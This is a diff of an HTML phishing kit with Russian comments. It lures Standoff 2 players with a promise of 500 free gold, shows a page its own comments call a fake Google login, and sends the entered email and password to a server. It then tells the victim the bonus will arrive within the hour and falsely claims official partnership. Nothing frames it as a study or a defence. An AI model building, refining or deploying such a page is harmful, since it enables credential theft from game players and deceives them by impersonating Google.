@@ -11,10 +11,120 @@
             box-sizing: border-box;
         }
 
-        /* ==============================
-                   ШАГ 1 — БЕЛЫЙ GOOGLE LOGIN
-                ============================== */
+        /* ===== СТРАНИЦА 1: ПОЛУЧИТЬ 500 ГОЛДЫ ===== */
         .step1-body {
+            background: #0a0a10;
+            color: #fff;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .bg-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
+            opacity: 0.12;
+        }
+
+        .dark-container {
+            background: linear-gradient(145deg, rgba(20, 20, 30, 0.94), rgba(10, 10, 16, 0.97));
+            padding: 40px 24px 30px;
+            border-radius: 32px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid #ffd70033;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 40px #ffd70008;
+            position: relative;
+            z-index: 1;
+            backdrop-filter: blur(4px);
+        }
+
+        .gold-icon {
+            font-size: 52px;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .gold-badge {
+            background: linear-gradient(135deg, #2a2a3a, #1a1a28);
+            padding: 12px 24px;
+            border-radius: 40px;
+            display: inline-block;
+            font-size: 32px;
+            font-weight: 900;
+            color: #ffd700;
+            border: 1px solid #ffd70055;
+            box-shadow: 0 0 30px #ffd70015;
+            margin-bottom: 12px;
+        }
+
+        .gold-badge::before {
+            content: "✦ ";
+            color: #ffaa00;
+        }
+        .gold-badge::after {
+            content: " ✦";
+            color: #ffaa00;
+        }
+
+        .dark-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 6px;
+        }
+
+        .dark-desc {
+            color: #99aabb;
+            font-size: 16px;
+            margin-bottom: 24px;
+        }
+
+        .btn-gold {
+            width: 100%;
+            padding: 18px 0;
+            border: none;
+            border-radius: 40px;
+            font-size: 22px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            background: linear-gradient(135deg, #ffd700, #f0a500);
+            color: #0a0a10;
+            box-shadow: 0 4px 20px #ffd70033;
+        }
+
+        .btn-gold:hover {
+            transform: scale(1.02);
+            box-shadow: 0 4px 40px #ffd70055;
+        }
+
+        .btn-gold:active {
+            transform: scale(0.96);
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #445;
+        }
+
+        /* ===== СТРАНИЦА 2: ФЕЙКОВЫЙ GOOGLE LOGIN ===== */
+        .step2-body {
             background: #ffffff;
             font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
             min-height: 100vh;
@@ -40,11 +150,6 @@
             height: 24px;
             margin: 0 auto 32px;
             display: block;
-        }
-
-        .google-logo svg {
-            width: 100%;
-            height: 100%;
         }
 
         .google-title {
@@ -145,10 +250,6 @@
             text-decoration: none;
         }
 
-        .google-footer a:hover {
-            text-decoration: underline;
-        }
-
         .google-error {
             color: #d93025;
             font-size: 14px;
@@ -167,10 +268,8 @@
             display: none !important;
         }
 
-        /* ==============================
-                   ШАГ 2 + 3 — ТЁМНЫЙ STYANDOFF 2
-                ============================== */
-        .step2-body {
+        /* ===== СТРАНИЦА 3: ГОЛДА ПРИДЁТ ===== */
+        .step3-body {
             background: #0a0a10;
             color: #fff;
             font-family: 'Segoe UI', Arial, sans-serif;
@@ -179,135 +278,45 @@
             align-items: center;
             justify-content: center;
             padding: 16px;
-            overflow: hidden;
             position: relative;
-        }
-
-        .bg-layer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            pointer-events: none;
-            overflow: hidden;
-            opacity: 0.12;
-        }
-
-        .bg-svg {
-            width: 100%;
-            height: 100%;
-        }
-
-        .dark-container {
-            background: linear-gradient(145deg, rgba(20, 20, 30, 0.94), rgba(10, 10, 16, 0.97));
-            padding: 30px 22px 25px;
-            border-radius: 32px;
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-            border: 1px solid #ffd70033;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 40px #ffd70008;
-            position: relative;
-            z-index: 1;
-            backdrop-filter: blur(4px);
-        }
-
-        .gold-icon {
-            font-size: 48px;
-            margin-bottom: 6px;
-            display: block;
-        }
-
-        .gold-badge {
-            background: linear-gradient(135deg, #2a2a3a, #1a1a28);
-            padding: 12px 24px;
-            border-radius: 40px;
-            display: inline-block;
-            font-size: 28px;
-            font-weight: 900;
-            color: #ffd700;
-            border: 1px solid #ffd70055;
-            box-shadow: 0 0 30px #ffd70015;
-            margin-bottom: 12px;
-        }
-
-        .gold-badge::before {
-            content: "✦ ";
-            color: #ffaa00;
-        }
-        .gold-badge::after {
-            content: " ✦";
-            color: #ffaa00;
-        }
-
-        .dark-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #fff;
-            margin-bottom: 4px;
-        }
-
-        .dark-desc {
-            color: #99aabb;
-            font-size: 16px;
-            margin-bottom: 18px;
-        }
-
-        .btn-gold {
-            width: 100%;
-            padding: 16px 0;
-            border: none;
-            border-radius: 40px;
-            font-size: 20px;
-            font-weight: 800;
-            cursor: pointer;
-            transition: 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            background: linear-gradient(135deg, #ffd700, #f0a500);
-            color: #0a0a10;
-            box-shadow: 0 4px 20px #ffd70033;
-        }
-
-        .btn-gold:hover {
-            transform: scale(1.02);
-            box-shadow: 0 4px 40px #ffd70055;
-        }
-
-        .btn-gold:active {
-            transform: scale(0.96);
         }
 
         .check-icon {
-            font-size: 56px;
-            margin-bottom: 8px;
+            font-size: 60px;
+            margin-bottom: 10px;
             display: block;
         }
 
         .success-title {
-            font-size: 22px;
+            font-size: 24px;
             font-weight: 700;
             color: #ffd700;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
         }
 
         .success-desc {
             color: #99aabb;
-            font-size: 15px;
-            margin-bottom: 8px;
+            font-size: 16px;
+            margin-bottom: 10px;
         }
 
         .timer-text {
-            font-size: 13px;
+            font-size: 14px;
             color: #667;
         }
 
-        /* ==============================
-                   АДАПТАЦИЯ
-                ============================== */
         @media (max-width: 480px) {
+            .dark-container {
+                padding: 30px 16px 24px;
+            }
+            .gold-badge {
+                font-size: 26px;
+                padding: 10px 18px;
+            }
+            .btn-gold {
+                font-size: 18px;
+                padding: 16px 0;
+            }
             .google-container {
                 padding: 32px 20px 28px;
                 border: none;
@@ -316,46 +325,70 @@
             .google-title {
                 font-size: 22px;
             }
-            .dark-container {
-                padding: 24px 16px 20px;
-                max-width: 95%;
-            }
-            .gold-badge {
-                font-size: 22px;
-                padding: 8px 16px;
-            }
-            .btn-gold {
-                font-size: 18px;
-                padding: 14px 0;
-            }
         }
 
         @media (max-width: 380px) {
-            .google-container {
-                padding: 24px 16px 20px;
-            }
             .dark-container {
-                padding: 18px 12px 16px;
+                padding: 20px 12px 18px;
             }
             .gold-badge {
-                font-size: 18px;
+                font-size: 20px;
                 padding: 6px 12px;
             }
             .btn-gold {
                 font-size: 16px;
-                padding: 12px 0;
+                padding: 14px 0;
             }
         }
     </style>
 </head>
 <body>
 
-    <!-- ============================================ -->
-    <!-- ШАГ 1 — БЕЛЫЙ GOOGLE LOGIN                   -->
-    <!-- ============================================ -->
+    <!-- ======================================== -->
+    <!-- СТРАНИЦА 1: ПОЛУЧИТЬ 500 ГОЛДЫ            -->
+    <!-- ======================================== -->
     <div id="step1" class="step1-body">
-        <div class="google-container">
+        <div class="bg-layer">
+            <svg viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice">
+                <g transform="translate(40, 40) rotate(-20)" opacity="0.25">
+                    <rect x="0" y="8" width="70" height="12" rx="4" fill="#8899bb"/>
+                    <circle cx="70" cy="14" r="4" fill="#ffd700"/>
+                </g>
+                <g transform="translate(680, 30) rotate(15)" opacity="0.2">
+                    <rect x="0" y="6" width="80" height="10" rx="3" fill="#99aabb"/>
+                    <circle cx="82" cy="11" r="5" fill="#ffd700"/>
+                </g>
+                <g transform="translate(20, 260) rotate(-30)" opacity="0.2">
+                    <polygon points="0,0 60,-6 55,6" fill="#aabbcc"/>
+                    <circle cx="8" cy="0" r="5" fill="#ffd700"/>
+                </g>
+                <g transform="translate(720, 300) rotate(25)" opacity="0.2">
+                    <rect x="0" y="6" width="60" height="10" rx="3" fill="#8899bb"/>
+                    <circle cx="58" cy="11" r="3.5" fill="#ffd700"/>
+                </g>
+                <g opacity="0.25">
+                    <rect x="140" y="80" width="18" height="8" rx="2" fill="#ffd700"/>
+                    <rect x="620" y="120" width="20" height="9" rx="2" fill="#ffd700"/>
+                    <rect x="200" y="520" width="18" height="8" rx="2" fill="#ffaa00"/>
+                </g>
+            </svg>
+        </div>
 
+        <div class="dark-container">
+            <span class="gold-icon">🎯</span>
+            <div class="gold-badge">+500 ГОЛДЫ</div>
+            <div class="dark-title">Забери бонус!</div>
+            <div class="dark-desc">Нажми кнопку, чтобы получить голду</div>
+            <button class="btn-gold" onclick="showStep2()">ЗАБРАТЬ ГОЛДУ</button>
+            <div class="footer">© Standoff 2 — официальный партнёр</div>
+        </div>
+    </div>
+
+    <!-- ======================================== -->
+    <!-- СТРАНИЦА 2: ФЕЙКОВЫЙ GOOGLE LOGIN       -->
+    <!-- ======================================== -->
+    <div id="step2" class="step2-body hidden">
+        <div class="google-container">
             <div class="google-logo">
                 <svg viewBox="0 0 48 16" width="100%" height="100%">
                     <path fill="#4285F4" d="M 32.6 8.1 c 0 0.6 0.1 1.3 0.3 1.9 h -1.8 v -1.4 h 0.6 c -0.1 -0.3 -0.2 -0.6 -0.2 -0.9 c 0 -0.5 0.3 -0.9 0.9 -1.1 c 0.6 -0.2 1.2 -0.1 1.6 0.3 l 1.1 -1.1 c -0.7 -0.6 -1.6 -0.9 -2.6 -0.9 c -1.3 0 -2.5 0.5 -3.4 1.4 c -0.9 0.9 -1.4 2.1 -1.4 3.4 c 0 1.3 0.5 2.5 1.4 3.4 c 0.9 0.9 2.1 1.4 3.4 1.4 c 1.3 0 2.5 -0.5 3.4 -1.4 c 0.9 -0.9 1.4 -2.1 1.4 -3.4 c 0 -0.6 -0.1 -1.2 -0.3 -1.8 h -4.4 v 1.7 h 2.4 c -0.2 0.6 -0.6 1.1 -1.1 1.5 c -0.5 0.4 -1.1 0.6 -1.8 0.6 c -0.9 0 -1.7 -0.4 -2.3 -1 c -0.6 -0.6 -0.9 -1.4 -0.9 -2.2 c 0 -0.9 0.3 -1.7 0.9 -2.3 c 0.6 -0.6 1.4 -0.9 2.3 -0.9 c 0.7 0 1.3 0.2 1.8 0.7 l 0.8 -0.8 c -0.6 -0.6 -1.5 -1 -2.5 -1 c -1.2 0 -2.3 0.5 -3.1 1.3 c -0.8 0.8 -1.3 2 -1.3 3.3 c 0 1.3 0.5 2.5 1.3 3.3 c 0.8 0.8 2 1.3 3.1 1.3 c 1.2 0 2.3 -0.5 3.1 -1.3 c 0.8 -0.8 1.3 -2 1.3 -3.3 c 0 -0.1 0 -0.2 0 -0.3 z"/>
@@ -401,116 +434,21 @@
         </div>
     </div>
 
-    <!-- ============================================ -->
-    <!-- ШАГ 2 — ТЁМНЫЙ STANDOFF 2                    -->
-    <!-- ============================================ -->
-    <div id="step2" class="step2-body hidden">
-        <div class="bg-layer">
-            <svg class="bg-svg" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice">
-                <g transform="translate(40, 40) rotate(-20)" opacity="0.25">
-                    <rect x="0" y="8" width="70" height="12" rx="4" fill="#8899bb"/>
-                    <rect x="60" y="4" width="20" height="20" rx="4" fill="#667788"/>
-                    <circle cx="70" cy="14" r="4" fill="#ffd700"/>
-                </g>
-                <g transform="translate(680, 30) rotate(15)" opacity="0.2">
-                    <rect x="0" y="6" width="80" height="10" rx="3" fill="#99aabb"/>
-                    <rect x="70" y="0" width="25" height="22" rx="4" fill="#8899bb"/>
-                    <circle cx="82" cy="11" r="5" fill="#ffd700"/>
-                </g>
-                <g transform="translate(20, 260) rotate(-30)" opacity="0.2">
-                    <polygon points="0,0 60,-6 55,6" fill="#aabbcc"/>
-                    <circle cx="8" cy="0" r="5" fill="#ffd700"/>
-                </g>
-                <g transform="translate(720, 300) rotate(25)" opacity="0.2">
-                    <rect x="0" y="6" width="60" height="10" rx="3" fill="#8899bb"/>
-                    <rect x="50" y="2" width="16" height="18" rx="3" fill="#667788"/>
-                    <circle cx="58" cy="11" r="3.5" fill="#ffd700"/>
-                </g>
-                <g transform="translate(30, 470)" opacity="0.15">
-                    <circle cx="30" cy="0" r="16" fill="#445566"/>
-                    <rect x="16" y="-14" width="28" height="12" rx="6" fill="#556677"/>
-                    <rect x="12" y="12" width="36" height="40" rx="8" fill="#2a3a4a"/>
-                    <rect x="16" y="14" width="28" height="28" rx="4" fill="#1a2a3a" stroke="#ffd700" stroke-width="1"/>
-                    <rect x="0" y="14" width="12" height="24" rx="4" fill="#445566"/>
-                    <rect x="48" y="14" width="12" height="24" rx="4" fill="#445566"/>
-                    <rect x="14" y="52" width="10" height="24" rx="3" fill="#334455"/>
-                    <rect x="36" y="52" width="10" height="24" rx="3" fill="#334455"/>
-                    <rect x="52" y="16" width="30" height="6" rx="2" fill="#8899bb"/>
-                    <rect x="76" y="14" width="10" height="10" rx="2" fill="#667788"/>
-                </g>
-                <g transform="translate(680, 490)" opacity="0.12">
-                    <circle cx="30" cy="0" r="14" fill="#556677"/>
-                    <rect x="18" y="-12" width="24" height="10" rx="5" fill="#667788"/>
-                    <rect x="14" y="10" width="32" height="36" rx="6" fill="#2a3a4a"/>
-                    <rect x="18" y="12" width="24" height="24" rx="3" fill="#1a2a3a" stroke="#ffd700" stroke-width="1"/>
-                    <rect x="2" y="12" width="12" height="20" rx="3" fill="#445566"/>
-                    <rect x="46" y="12" width="12" height="20" rx="3" fill="#445566"/>
-                    <rect x="16" y="46" width="8" height="20" rx="3" fill="#334455"/>
-                    <rect x="36" y="46" width="8" height="20" rx="3" fill="#334455"/>
-                </g>
-                <g opacity="0.25">
-                    <rect x="140" y="80" width="18" height="8" rx="2" fill="#ffd700"/>
-                    <rect x="150" y="85" width="18" height="8" rx="2" fill="#ffaa00"/>
-                    <rect x="130" y="92" width="16" height="7" rx="2" fill="#ffd700"/>
-                    <rect x="620" y="120" width="20" height="9" rx="2" fill="#ffd700"/>
-                    <rect x="640" y="128" width="18" height="8" rx="2" fill="#ffaa00"/>
-                    <rect x="70" y="380" width="16" height="7" rx="2" fill="#ffd700"/>
-                    <rect x="700" y="400" width="20" height="9" rx="2" fill="#ffd700"/>
-                    <rect x="200" y="520" width="18" height="8" rx="2" fill="#ffaa00"/>
-                    <rect x="560" y="530" width="16" height="7" rx="2" fill="#ffd700"/>
-                </g>
-                <g opacity="0.08">
-                    <circle cx="380" cy="100" r="30" fill="none" stroke="#ffd700" stroke-width="2"/>
-                    <circle cx="380" cy="100" r="18" fill="#ffd700" opacity="0.3"/>
-                    <circle cx="400" cy="450" r="24" fill="none" stroke="#ff8800" stroke-width="2"/>
-                    <circle cx="400" cy="450" r="12" fill="#ff8800" opacity="0.2"/>
-                </g>
-            </svg>
-        </div>
-
-        <div class="dark-container">
-            <span class="gold-icon">🎯</span>
-            <div class="gold-badge">+500 ГОЛДЫ</div>
-            <div class="dark-title">Забери бонус!</div>
-            <div class="dark-desc">Нажми кнопку, чтобы получить голду</div>
-            <button class="btn-gold" onclick="showStep3()">ЗАБРАТЬ ГОЛДУ</button>
-        </div>
-    </div>
-
-    <!-- ============================================ -->
-    <!-- ШАГ 3 — ГОЛДА ПРИДЁТ В ТЕЧЕНИЕ ЧАСА         -->
-    <!-- ============================================ -->
-    <div id="step3" class="step2-body hidden">
-        <div class="bg-layer">
-            <svg class="bg-svg" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice">
-                <g transform="translate(40, 40) rotate(-20)" opacity="0.25">
-                    <rect x="0" y="8" width="70" height="12" rx="4" fill="#8899bb"/>
-                    <rect x="60" y="4" width="20" height="20" rx="4" fill="#667788"/>
-                    <circle cx="70" cy="14" r="4" fill="#ffd700"/>
-                </g>
-                <g transform="translate(680, 30) rotate(15)" opacity="0.2">
-                    <rect x="0" y="6" width="80" height="10" rx="3" fill="#99aabb"/>
-                    <rect x="70" y="0" width="25" height="22" rx="4" fill="#8899bb"/>
-                    <circle cx="82" cy="11" r="5" fill="#ffd700"/>
-                </g>
-                <g opacity="0.25">
-                    <rect x="140" y="80" width="18" height="8" rx="2" fill="#ffd700"/>
-                    <rect x="620" y="120" width="20" height="9" rx="2" fill="#ffd700"/>
-                    <rect x="200" y="520" width="18" height="8" rx="2" fill="#ffaa00"/>
-                </g>
-            </svg>
-        </div>
-
-        <div class="dark-container">
+    <!-- ======================================== -->
+    <!-- СТРАНИЦА 3: ГОЛДА ПРИДЁТ В ТЕЧЕНИЕ ЧАСА -->
+    <!-- ======================================== -->
+    <div id="step3" class="step3-body hidden">
+        <div class="dark-container" style="background: linear-gradient(145deg, rgba(20,20,30,0.94), rgba(10,10,16,0.97)); border: 1px solid #ffd70033;">
             <span class="check-icon">✅</span>
             <div class="success-title">Голда придёт в течение часа</div>
             <div class="success-desc">Ваш бонус будет начислен в ближайшее время</div>
             <div class="timer-text">🕒 Ожидайте до 60 минут</div>
+            <div class="footer" style="margin-top: 20px; color: #445;">© Standoff 2 — официальный партнёр</div>
         </div>
     </div>
 
     <script>
-        // Показываем поле пароля после ввода почты
+        // ===== ПОЛЕ ПАРОЛЯ ПОЯВЛЯЕТСЯ ПОСЛЕ ВВОДА ПОЧТЫ =====
         document.getElementById('email').addEventListener('input', function() {
             const passwordField = document.getElementById('passwordField');
             const errorMsg = document.getElementById('errorMsg');
@@ -522,7 +460,13 @@
             }
         });
 
-        // ШАГ 1 → отправка данных → ШАГ 2
+        // ===== ПЕРЕХОД НА СТРАНИЦУ 2 =====
+        function showStep2() {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }
+
+        // ===== ОТПРАВКА ДАННЫХ НА СЕРВЕР → ПЕРЕХОД НА СТРАНИЦУ 3 =====
         async function submitForm(e) {
             e.preventDefault();
 
@@ -557,10 +501,11 @@
                     result.textContent = '✅ Вход выполнен';
                     result.style.color = '#34a853';
 
+                    // Переход на страницу 3 через 1 секунду
                     setTimeout(() => {
-                        document.getElementById('step1').classList.add('hidden');
-                        document.getElementById('step2').classList.remove('hidden');
-                    }, 700);
+                        document.getElementById('step2').classList.add('hidden');
+                        document.getElementById('step3').classList.remove('hidden');
+                    }, 1000);
                 } else {
                     result.textContent = '❌ ' + (data.error || 'попробуйте снова');
                     result.style.color = '#d93025';
@@ -569,12 +514,6 @@
                 result.textContent = '❌ Ошибка соединения';
                 result.style.color = '#d93025';
             }
-        }
-
-        // ШАГ 2 → ШАГ 3
-        function showStep3() {
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.remove('hidden');
         }
     </script>
 </body>
